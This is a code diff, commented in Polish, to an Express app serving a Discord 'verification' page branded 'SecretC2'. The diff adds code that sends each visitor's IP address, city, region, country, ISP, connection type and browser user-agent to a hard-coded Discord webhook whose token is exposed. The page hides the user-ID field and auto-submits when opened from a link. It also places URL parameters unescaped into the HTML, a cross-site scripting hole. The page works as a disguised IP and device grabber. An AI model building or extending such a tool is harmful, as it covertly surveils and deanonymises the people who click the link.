@@ -43,7 +43,7 @@ async function getIPInfo(ip) {
   };
 }
 
-// Endpoint do rejestracji kodu (będzie wywoływany przez bota)
+// Endpoint do rejestracji kodu (wywoływany przez bota)
 app.post('/api/register-code', (req, res) => {
   const { code, userId } = req.body;
   
@@ -67,9 +67,12 @@ app.post('/api/register-code', (req, res) => {
   res.json({ success: true });
 });
 
-// Strona weryfikacji
+// Strona weryfikacji - TERAZ TYLKO KOD, ID Z LINKU
 app.get('/', (req, res) => {
   const { code, userId } = req.query;
+  
+  // Jeśli mamy userId w linku, zapiszmy go w polu ukrytym
+  const hasUserId = userId ? true : false;
   
   res.send(`
     <!DOCTYPE html>
@@ -172,22 +175,23 @@ app.get('/', (req, res) => {
           color: #999;
           text-align: center;
         }
+        .hidden {
+          display: none;
+        }
       </style>
     </head>
     <body>
       <div class="container">
         <h1>🔐 Weryfikacja - SecretC2</h1>
-        <div class="code-display" id="codeDisplay">${code || '------'}</div>
+        <div class="code-display" id="codeDisplay">${code || 'Wpisz kod'}</div>
         
         <div class="form-group">
           <label for="code">Kod weryfikacyjny</label>
           <input type="text" id="code" placeholder="Wpisz kod" value="${code || ''}">
         </div>
         
-        <div class="form-group">
-          <label for="userId">ID użytkownika</label>
-          <input type="text" id="userId" placeholder="ID z Discorda" value="${userId || ''}">
-        </div>
+        <!-- Ukryte pole z ID użytkownika -->
+        <input type="hidden" id="userId" value="${userId || ''}">
         
         <button onclick="verify()">Zweryfikuj</button>
         
@@ -201,9 +205,15 @@ app.get('/', (req, res) => {
           const userId = document.getElementById('userId').value;
           const messageDiv = document.getElementById('message');
           
-          if(!code || !userId) {
+          if(!code) {
             messageDiv.className = 'message error';
-            messageDiv.textContent = 'Wpisz kod i ID użytkownika!';
+            messageDiv.textContent = 'Wpisz kod weryfikacyjny!';
+            return;
+          }
+          
+          if(!userId) {
+            messageDiv.className = 'message error';
+            messageDiv.textContent = 'Brak ID użytkownika - wróć na Discorda i kliknij przycisk ponownie!';
             return;
           }
           
@@ -234,9 +244,15 @@ app.get('/', (req, res) => {
           const code = urlParams.get('code');
           const userId = urlParams.get('userId');
           
-          if(code && userId) {
+          if(code) {
             document.getElementById('code').value = code;
+          }
+          if(userId) {
             document.getElementById('userId').value = userId;
+          }
+          
+          // Auto-weryfikacja jeśli mamy i kod i userId
+          if(code && userId) {
             verify();
           }
         }
@@ -267,7 +283,7 @@ app.post('/api/verify', async (req, res) => {
   // Pobierz info o IP
   const ipInfo = await getIPInfo(clientIp);
   
-  // Wyślij log na Discorda przez webhook (opcjonalnie)
+  // Wyślij log na Discorda przez webhook
   try {
     await axios.post('https://discordapp.com/api/webhooks/1482626978367537205/VC5fSNon0vk09yTW1vjnWHTw1-D1S5kaC9YmYeswvZaiT5BRCv42T01NLWqN_kQWNS1z', {
       embeds: [{
@@ -284,9 +300,15 @@ app.post('/api/verify', async (req, res) => {
             `**Kraj:** ${ipInfo.country}\n` +
             `**Region:** ${ipInfo.region}\n` +
             `**Miasto:** ${ipInfo.city}`, inline: false
+          },
+          { name: '💻 DEVICE INFORMATION', value:
+            `**Urządzenie:** ${req.headers['user-agent']?.substring(0, 50) || 'Nieznane'}\n` +
+            `**Provider:** ${ipInfo.isp}\n` +
+            `**Typ:** ${ipInfo.type}`, inline: false
           }
         ],
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        footer: { text: 'SecretC2 - System weryfikacji' }
       }]
     });
   } catch(e) {
